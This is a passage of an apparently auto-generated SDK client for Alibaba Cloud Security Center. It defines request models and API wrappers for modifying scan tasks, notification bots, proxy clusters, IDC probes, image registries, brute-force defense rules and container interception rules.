    <!-- -->', example='EMG_VUL_SCHEDULE_SCAN'),
  taskType?: string(name='TaskType', description='The type of the task. Valid values:

*   **VIRUS_VUL_SCHEDULE_SCAN**: virus detection task
*   **IMAGE_SCAN**: image scan task
*   **EMG_VUL_SCHEDULE_SCAN**: urgent vulnerability scan task

Valid values:

*   VIRUS_VUL_SCHEDULE_SCAN

    <!-- -->

    :

    <!-- -->

    virus detection task

    <!-- -->

*   IMAGE_SCAN

    <!-- -->

    :

    <!-- -->

    image scan task

    <!-- -->

*   EMG_VUL_SCHEDULE_SCAN

    <!-- -->

    :

    <!-- -->

    urgent vulnerability scan task

    <!-- -->', example='VIRUS_VUL_SCHEDULE_SCAN'),
}

model ModifyCycleTaskResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='1AA33E30-7192-5648-93CD-D0E476A2****'),
}

model ModifyCycleTaskResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyCycleTaskResponseBody(name='body'),
}

/**
 * @summary Modifies the execution cycle of periodic tasks, including image scan, urgent vulnerability scan, and virus detection tasks.
 *
 * @param request ModifyCycleTaskRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyCycleTaskResponse
 */
async function modifyCycleTaskWithOptions(request: ModifyCycleTaskRequest, runtime: Util.RuntimeOptions): ModifyCycleTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.configId)) {
    query['ConfigId'] = request.configId;
  }
  if (!Util.isUnset(request.enable)) {
    query['Enable'] = request.enable;
  }
  if (!Util.isUnset(request.firstDateStr)) {
    query['FirstDateStr'] = request.firstDateStr;
  }
  if (!Util.isUnset(request.intervalPeriod)) {
    query['IntervalPeriod'] = request.intervalPeriod;
  }
  if (!Util.isUnset(request.param)) {
    query['Param'] = request.param;
  }
  if (!Util.isUnset(request.periodUnit)) {
    query['PeriodUnit'] = request.periodUnit;
  }
  if (!Util.isUnset(request.targetEndTime)) {
    query['TargetEndTime'] = request.targetEndTime;
  }
  if (!Util.isUnset(request.targetStartTime)) {
    query['TargetStartTime'] = request.targetStartTime;
  }
  if (!Util.isUnset(request.taskName)) {
    query['TaskName'] = request.taskName;
  }
  if (!Util.isUnset(request.taskType)) {
    query['TaskType'] = request.taskType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyCycleTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modifies the execution cycle of periodic tasks, including image scan, urgent vulnerability scan, and virus detection tasks.
 *
 * @param request ModifyCycleTaskRequest
 * @return ModifyCycleTaskResponse
 */
async function modifyCycleTask(request: ModifyCycleTaskRequest): ModifyCycleTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyCycleTaskWithOptions(request, runtime);
}

model ModifyDingTalkStatusRequest {
  ids?: string(name='Ids', description='The notification IDs of DingTalk chatbots. Separate multiple IDs with commas (,).

>  You can call the [DescribeDingTalk](~~DescribeDingTalk~~) operation to query the notification IDs.

This parameter is required.', example='2259'),
  status?: int32(name='Status', description='The notification status of a DingTalk chatbot. Valid values:

*   **0**: disabled
*   **1**: enabled

This parameter is required.', example='0'),
}

model ModifyDingTalkStatusResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='81DCBD76-196C-57A5-9C7D-F14DE8E1****'),
}

model ModifyDingTalkStatusResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyDingTalkStatusResponseBody(name='body'),
}

/**
 * @summary Changes the notification status of a DingTalk chatbot.
 *
 * @description You can call this operation only if you use Security Center Enterprise.
 *
 * @param request ModifyDingTalkStatusRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyDingTalkStatusResponse
 */
async function modifyDingTalkStatusWithOptions(request: ModifyDingTalkStatusRequest, runtime: Util.RuntimeOptions): ModifyDingTalkStatusResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.ids)) {
    query['Ids'] = request.ids;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyDingTalkStatus',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Changes the notification status of a DingTalk chatbot.
 *
 * @description You can call this operation only if you use Security Center Enterprise.
 *
 * @param request ModifyDingTalkStatusRequest
 * @return ModifyDingTalkStatusResponse
 */
async function modifyDingTalkStatus(request: ModifyDingTalkStatusRequest): ModifyDingTalkStatusResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyDingTalkStatusWithOptions(request, runtime);
}

model ModifyEmgVulSubmitRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  name?: string(name='Name', description='The name of the vulnerability.

This parameter is required.', example='scan:ASCV-2019-032401'),
  userAgreement?: string(name='UserAgreement', description='Specifies whether to scan for urgent vulnerabilities. Valid values:

*   **yes**
*   **no**

This parameter is required.', example='yes'),
}

model ModifyEmgVulSubmitResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='52A3AEE6-114A-499D-8990-4BA9B27FE0AA'),
}

model ModifyEmgVulSubmitResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyEmgVulSubmitResponseBody(name='body'),
}

/**
 * @summary Runs a scan task for urgent vulnerabilities.
 *
 * @param request ModifyEmgVulSubmitRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyEmgVulSubmitResponse
 */
async function modifyEmgVulSubmitWithOptions(request: ModifyEmgVulSubmitRequest, runtime: Util.RuntimeOptions): ModifyEmgVulSubmitResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.userAgreement)) {
    query['UserAgreement'] = request.userAgreement;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyEmgVulSubmit',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Runs a scan task for urgent vulnerabilities.
 *
 * @param request ModifyEmgVulSubmitRequest
 * @return ModifyEmgVulSubmitResponse
 */
async function modifyEmgVulSubmit(request: ModifyEmgVulSubmitRequest): ModifyEmgVulSubmitResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyEmgVulSubmitWithOptions(request, runtime);
}

model ModifyGroupPropertyRequest {
  data?: string(name='Data', description='The new attributes of the server group. You can specify the following parameters to configure the attributes:

*   **groupFlag**: the type of the server group. Valid values: 0 and 1. The value **0** specifies the Default server group. The value **1** specifies other server groups.
*   **groupId**: the ID of the server group.
*   **groupIndex**: no meaning. You can leave this parameter empty.
*   **groupName**: the name of the server group. The value is the new name of the server group. The new name cannot be the same as the original name of the server group.

>  You can call the [DescribeAllGroups](~~DescribeAllGroups~~) operation to obtain the values of the groupFlag and groupId parameters. You cannot change the value of the groupFlag or groupId parameter. You can change only the value of the groupName parameter.

This parameter is required.', example='[{"groupFlag":1,"groupId":8436682,"groupIndex":,"groupName":"example"}]'),
}

model ModifyGroupPropertyResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model ModifyGroupPropertyResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyGroupPropertyResponseBody(name='body'),
}

/**
 * @summary Changes the name of a server group.
 *
 * @param request ModifyGroupPropertyRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyGroupPropertyResponse
 */
async function modifyGroupPropertyWithOptions(request: ModifyGroupPropertyRequest, runtime: Util.RuntimeOptions): ModifyGroupPropertyResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.data)) {
    query['Data'] = request.data;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyGroupProperty',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Changes the name of a server group.
 *
 * @param request ModifyGroupPropertyRequest
 * @return ModifyGroupPropertyResponse
 */
async function modifyGroupProperty(request: ModifyGroupPropertyRequest): ModifyGroupPropertyResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyGroupPropertyWithOptions(request, runtime);
}

model ModifyHybridProxyClusterRequest {
  clusterName?: string(name='ClusterName', description='The name of the proxy cluster.

This parameter is required.', example='sas-test-cnnf'),
  remark?: string(name='Remark', description='The remarks.

This parameter is required.', example='test'),
}

model ModifyHybridProxyClusterResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='8B4B6E6D-B0B0-5F05-A14E-82917D9648EE'),
}

model ModifyHybridProxyClusterResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyHybridProxyClusterResponseBody(name='body'),
}

/**
 * @summary 修改代理集群
 *
 * @param request ModifyHybridProxyClusterRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyHybridProxyClusterResponse
 */
async function modifyHybridProxyClusterWithOptions(request: ModifyHybridProxyClusterRequest, runtime: Util.RuntimeOptions): ModifyHybridProxyClusterResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterName)) {
    query['ClusterName'] = request.clusterName;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyHybridProxyCluster',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary 修改代理集群
 *
 * @param request ModifyHybridProxyClusterRequest
 * @return ModifyHybridProxyClusterResponse
 */
async function modifyHybridProxyCluster(request: ModifyHybridProxyClusterRequest): ModifyHybridProxyClusterResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyHybridProxyClusterWithOptions(request, runtime);
}

model ModifyHybridProxyPolicyRequest {
  clusterName?: string(name='ClusterName', description='The name of the proxy cluster.

This parameter is required.', example='sas-proxy'),
  policyInfo?: string(name='PolicyInfo', description='The policy of the proxy cluster.

This parameter is required.', example='[
    {
        "policyType": "limitFrequency",
        "info":
        [
            {
                "type": "file",
                "config": "10"
            }
        ]
    },
    {
        "policyType": "limitBandWidth",
        "info":
        [
            {
                "type": "net"
            },
            {
                "type": "process"
            }
        ]
    }
]'),
}

model ModifyHybridProxyPolicyResponseBody = {
  messgae?: string(name='Messgae', description='The message of the request.', example='clusterName data not exist'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='A4EB8B1C-1DEC-5E18-BCD0-D1BBB3936FA7'),
}

model ModifyHybridProxyPolicyResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyHybridProxyPolicyResponseBody(name='body'),
}

/**
 * @summary 修改代理策略
 *
 * @param request ModifyHybridProxyPolicyRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyHybridProxyPolicyResponse
 */
async function modifyHybridProxyPolicyWithOptions(request: ModifyHybridProxyPolicyRequest, runtime: Util.RuntimeOptions): ModifyHybridProxyPolicyResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterName)) {
    query['ClusterName'] = request.clusterName;
  }
  if (!Util.isUnset(request.policyInfo)) {
    query['PolicyInfo'] = request.policyInfo;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyHybridProxyPolicy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary 修改代理策略
 *
 * @param request ModifyHybridProxyPolicyRequest
 * @return ModifyHybridProxyPolicyResponse
 */
async function modifyHybridProxyPolicy(request: ModifyHybridProxyPolicyRequest): ModifyHybridProxyPolicyResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyHybridProxyPolicyWithOptions(request, runtime);
}

model ModifyIdcProbeRequest {
  idcName?: string(name='IdcName', description='The name of the data center.', example='test'),
  idcRegion?: string(name='IdcRegion', description='The region ID of the data center.', example='Hangzhou'),
  intervalPeriod?: int32(name='IntervalPeriod', description='The scan interval.', example='1'),
  ipSegments?: string(name='IpSegments', description='The settings of the CIDR block.', example='192.168.XX.XX/24'),
  linuxPort?: string(name='LinuxPort', description='The Linux port.', example='80'),
  periodUnit?: string(name='PeriodUnit', description='The unit of the scan interval. Valid values:

*   **day**
*   **hour**', example='day'),
  status?: int32(name='Status', description='The usage status. Valid values:

*   **0**: enabled.
*   **1**: disabled.', example='1'),
  uuids?: string(name='Uuids', description='The UUID of the server. Separate multiple UUIDs with commas (,).

> You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUID.

This parameter is required.', example='5b6d4072118f487094199cedf90c****,f6310b7976144639867beea2f346****'),
  winPort?: string(name='WinPort', description='The Windows port.', example='40'),
}

model ModifyIdcProbeResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='20456DD5-5CBF-5015-9173-12CA4246B***'),
}

model ModifyIdcProbeResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyIdcProbeResponseBody(name='body'),
}

/**
 * @summary Modifies the configurations of an IDC probe.
 *
 * @param request ModifyIdcProbeRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyIdcProbeResponse
 */
async function modifyIdcProbeWithOptions(request: ModifyIdcProbeRequest, runtime: Util.RuntimeOptions): ModifyIdcProbeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.idcName)) {
    query['IdcName'] = request.idcName;
  }
  if (!Util.isUnset(request.idcRegion)) {
    query['IdcRegion'] = request.idcRegion;
  }
  if (!Util.isUnset(request.intervalPeriod)) {
    query['IntervalPeriod'] = request.intervalPeriod;
  }
  if (!Util.isUnset(request.ipSegments)) {
    query['IpSegments'] = request.ipSegments;
  }
  if (!Util.isUnset(request.linuxPort)) {
    query['LinuxPort'] = request.linuxPort;
  }
  if (!Util.isUnset(request.periodUnit)) {
    query['PeriodUnit'] = request.periodUnit;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  if (!Util.isUnset(request.winPort)) {
    query['WinPort'] = request.winPort;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyIdcProbe',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modifies the configurations of an IDC probe.
 *
 * @param request ModifyIdcProbeRequest
 * @return ModifyIdcProbeResponse
 */
async function modifyIdcProbe(request: ModifyIdcProbeRequest): ModifyIdcProbeResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyIdcProbeWithOptions(request, runtime);
}

model ModifyImageFixCycleConfigRequest {
  imageFixCycle?: int32(name='ImageFixCycle', description='The cycle of the scheduled fix. Unit: day.', example='7'),
  imageFixSwitch?: string(name='ImageFixSwitch', description='Specifies whether to enable the schedule image fix.

*   **on**: enable
*   **off**: disable', example='on'),
  imageFixTarget?: string(name='ImageFixTarget', description='The range of the scheduled fix. The value of this parameter is in the JSON format and contains the following fields:

*   **type**: The type of the image. The value is fixed to repo.
*   **target**: The content of the image. The value is in the format of Namespace/Image repository.', example='{\\\\"type\\\\":\\\\"repo\\\\",\\\\"target\\\\":[\\\\"cdp-uat/zentao\\\\",\\\\"qa-dac/yyuan9\\\\",\\\\"cafdms-qa/xxl-job-admin\\\\"]}'),
  imageTimeRange?: int32(name='ImageTimeRange', description='The time range during which the image was modified. Unit: day.', example='30'),
}

model ModifyImageFixCycleConfigResponseBody = {
  data?: boolean(name='Data', description='Indicates whether the configurations of the scheduled image fix are modified.

*   **true**
*   **false**', example='true'),
  requestId?: string(name='RequestId', description='The request ID.', example='F7A4DF7E-57A4-5BBF-8290-223754AD****'),
}

model ModifyImageFixCycleConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyImageFixCycleConfigResponseBody(name='body'),
}

/**
 * @summary Modifies the configurations of a scheduled image fix.
 *
 * @param request ModifyImageFixCycleConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyImageFixCycleConfigResponse
 */
async function modifyImageFixCycleConfigWithOptions(request: ModifyImageFixCycleConfigRequest, runtime: Util.RuntimeOptions): ModifyImageFixCycleConfigResponse {
  Util.validateModel(request);
  var body : map[string]any = {};
  if (!Util.isUnset(request.imageFixCycle)) {
    body['ImageFixCycle'] = request.imageFixCycle;
  }
  if (!Util.isUnset(request.imageFixSwitch)) {
    body['ImageFixSwitch'] = request.imageFixSwitch;
  }
  if (!Util.isUnset(request.imageFixTarget)) {
    body['ImageFixTarget'] = request.imageFixTarget;
  }
  if (!Util.isUnset(request.imageTimeRange)) {
    body['ImageTimeRange'] = request.imageTimeRange;
  }
  var req = new OpenApi.OpenApiRequest{ 
    body = OpenApiUtil.parseToMap(body),
  };
  var params = new OpenApi.Params{
    action = 'ModifyImageFixCycleConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modifies the configurations of a scheduled image fix.
 *
 * @param request ModifyImageFixCycleConfigRequest
 * @return ModifyImageFixCycleConfigResponse
 */
async function modifyImageFixCycleConfig(request: ModifyImageFixCycleConfigRequest): ModifyImageFixCycleConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyImageFixCycleConfigWithOptions(request, runtime);
}

model ModifyImageRegistryRequest {
  id?: long(name='Id', description='The ID of the image repository. You can call the listImageRegistry operation to query the ID of the image repository.', example='390103286'),
  password?: string(name='Password', description='The password.', example='********************'),
  transPerHour?: int32(name='TransPerHour', description='The number of images that are scanned per hour.', example='10'),
  userName?: string(name='UserName', description='The username.', example='xxxx'),
}

model ModifyImageRegistryResponseBody = {
  code?: string(name='Code', description='The HTTP status code.', example='200'),
  data?: any(name='Data', description='N/A', example='N/A'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code.', example='200'),
  message?: string(name='Message', description='The returned message.', example='success'),
  requestId?: string(name='RequestId', description='The request ID.', example='379a9b8f-107b-4630-9e95-2299a1ea****'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
  timeCost?: long(name='TimeCost', description='The execution duration.', example='1'),
}

model ModifyImageRegistryResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyImageRegistryResponseBody(name='body'),
}

/**
 * @summary Modifies the transfer time of an image repository.
 *
 * @param request ModifyImageRegistryRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyImageRegistryResponse
 */
async function modifyImageRegistryWithOptions(request: ModifyImageRegistryRequest, runtime: Util.RuntimeOptions): ModifyImageRegistryResponse {
  Util.validateModel(request);
  var body : map[string]any = {};
  if (!Util.isUnset(request.id)) {
    body['Id'] = request.id;
  }
  if (!Util.isUnset(request.password)) {
    body['Password'] = request.password;
  }
  if (!Util.isUnset(request.transPerHour)) {
    body['TransPerHour'] = request.transPerHour;
  }
  if (!Util.isUnset(request.userName)) {
    body['UserName'] = request.userName;
  }
  var req = new OpenApi.OpenApiRequest{ 
    body = OpenApiUtil.parseToMap(body),
  };
  var params = new OpenApi.Params{
    action = 'ModifyImageRegistry',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modifies the transfer time of an image repository.
 *
 * @param request ModifyImageRegistryRequest
 * @return ModifyImageRegistryResponse
 */
async function modifyImageRegistry(request: ModifyImageRegistryRequest): ModifyImageRegistryResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyImageRegistryWithOptions(request, runtime);
}

model ModifyInstanceAntiBruteForceRuleRequest {
  newRuleId?: long(name='NewRuleId', description='The ID of the defense rule.

This parameter is required.', example='65767'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.XX.XX'),
  uuid?: string(name='Uuid', description='The UUID of the server for which you want to modify the defense rule. You can call the [DescribeCloudCenterInstances](https://help.aliyun.com/document_detail/141932.html) operation to query the UUIDs of servers.

This parameter is required.', example='7cc91747-2845-40d4-bb69-c077597f****'),
}

model ModifyInstanceAntiBruteForceRuleResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='4BE468CE-47A0-54F0-98A1-E253546E6A2C'),
}

model ModifyInstanceAntiBruteForceRuleResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyInstanceAntiBruteForceRuleResponseBody(name='body'),
}

/**
 * @summary Modifies the defense rule against brute-force attacks that is applied to a specified server.
 *
 * @param request ModifyInstanceAntiBruteForceRuleRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyInstanceAntiBruteForceRuleResponse
 */
async function modifyInstanceAntiBruteForceRuleWithOptions(request: ModifyInstanceAntiBruteForceRuleRequest, runtime: Util.RuntimeOptions): ModifyInstanceAntiBruteForceRuleResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.newRuleId)) {
    query['NewRuleId'] = request.newRuleId;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyInstanceAntiBruteForceRule',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Modifies the defense rule against brute-force attacks that is applied to a specified server.
 *
 * @param request ModifyInstanceAntiBruteForceRuleRequest
 * @return ModifyInstanceAntiBruteForceRuleResponse
 */
async function modifyInstanceAntiBruteForceRule(request: ModifyInstanceAntiBruteForceRuleRequest): ModifyInstanceAntiBruteForceRuleResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyInstanceAntiBruteForceRuleWithOptions(request, runtime);
}

model ModifyInterceptionRuleRequest {
  clusterId?: string(name='ClusterId', description='The ID of the container cluster.

> You can call the [DescribeGroupedContainerInstances](https://help.aliyun.com/document_detail/182997.html) operation to query the IDs of container clusters.', example='c17ef568f81884cdab402decd5fcd****'),
  dstTarget?: map[string]any(name='DstTarget', description='The destination objects of the rule. The following parameters are included:

*   targetId: the ID of the destination object. You can call the [ListInterceptionTargetPage](~~ListInterceptionTargetPage~~) operation to query the ID.
*   ports: the destination port ranges.', example='{"targetId":600069,"ports":["80/8088"]}'),
  interceptType?: int32(name='InterceptType', description='The interception mode. Valid values:

*   **1**: block
*   **2**: alert
*   **3**: allow', example='1'),
  orderIndex?: long(name='OrderIndex', description='The priority of the rule. Valid values: 1 to 1000. A smaller value indicates a higher priority.', example='1'),
  ruleId?: long(name='RuleId', description='The ID of the rule.

This parameter is required.', example='500018'),
  ruleName?: string(name='RuleName', description='The name of the rule.', example='tetsRule'),
  ruleSwitch?: int32(name='RuleSwitch', description='Specifies whether the rule is enabled. Valid values:

*   **1**: enabled
*   **0**: disabled', example='1'),
  srcTarget?: map[string]any(name='SrcTarget', description='The source object of the rule. The following parameters are included:

*   targetId: the ID of the source object. You can call the [ListInterceptionTargetPage](~~ListInterceptionTargetPage~~) operation to query the ID.', example='{"targetId":400989}'),
}

model ModifyInterceptionRuleShrinkRequest {
  clusterId?: string(name='ClusterId', description='The ID of the container cluster.

> You can call the [DescribeGroupedContainerInstances](https://help.aliyun.com/document_detail/182997.html) operation to query the IDs of container clusters.', example='c17ef568f81884cdab402decd5fcd****'),
  dstTargetShrink?: string(name='DstTarget', description='The destination objects of the rule. The following parameters are included:

*   targetId: the ID of the destination object. You can call the [ListInterceptionTargetPage](~~ListInterceptionTargetPage~~) operation to query the ID.
*   ports: the destination port ranges.', example='{"targetId":600069,"ports":["80/8088"]}'),
  interceptType?: int32(name='InterceptType', description='The interception mode. Valid values:

*   **1**: block
*   **2**: alert
*   **3**: allow', example='1'),
  orderIndex?: long(name='OrderIndex', description='The priority of the rule. Valid values: 1 to 1000. A smaller value indicates a higher priority.', example='1'),
  ruleId?: long(name='RuleId', description='The ID of the rule.

This parameter is required.', example='500018'),
  ruleName?: string(name='RuleName', description='The name of the rule.', example='tetsRule'),
  ruleSwitch?: int32(name='RuleSwitch', description='Specifies whether the rule is enabled. Valid values:

*   **1**: enabled
*   **0**: disabled', example='1'),
  srcTargetShrink?: string(name='SrcTarget', description='The source object of the rule. The following parameters are included:

*   targetId: the ID of the source object. You can call the [ListInterceptionTargetPage](~~ListInterceptionTargetPage~~) operation to query the ID.', example='{"targetId":400989}'),
}

model ModifyInterceptionRuleResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='6961B151-B43C-533B-8B2E-1D3151D7F5B2'),
}

model ModifyInterceptionRuleResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: ModifyInterceptionRuleResponseBody(name='body'),
}

/**
 * @summary Modifies a proactive defense rule for containers.
 *
 * @param tmpReq ModifyInterceptionRuleRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return ModifyInterceptionRuleResponse
 */
async function modifyInterceptionRuleWithOptions(tmpReq: ModifyInterceptionRuleRequest, runtime: Util.RuntimeOptions): ModifyInterceptionRuleResponse {
  Util.validateModel(tmpReq);
  var request = new ModifyInterceptionRuleShrinkRequest{};
  OpenApiUtil.convert(tmpReq, request);
  if (!Util.isUnset(tmpReq.dstTarget)) {
    request.dstTargetShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.dstTarget, 'DstTarget', 'json');
  }
  if (!Util.isUnset(tmpReq.srcTarget)) {
    request.srcTargetShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.srcTarget, 'SrcTarget', 'json');
  }
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.dstTargetShrink)) {
    query['DstTarget'] = request.dstTargetShrink;
  }
  if (!Util.isUnset(request.interceptType)) {
    query['InterceptType'] = request.interceptType;
  }
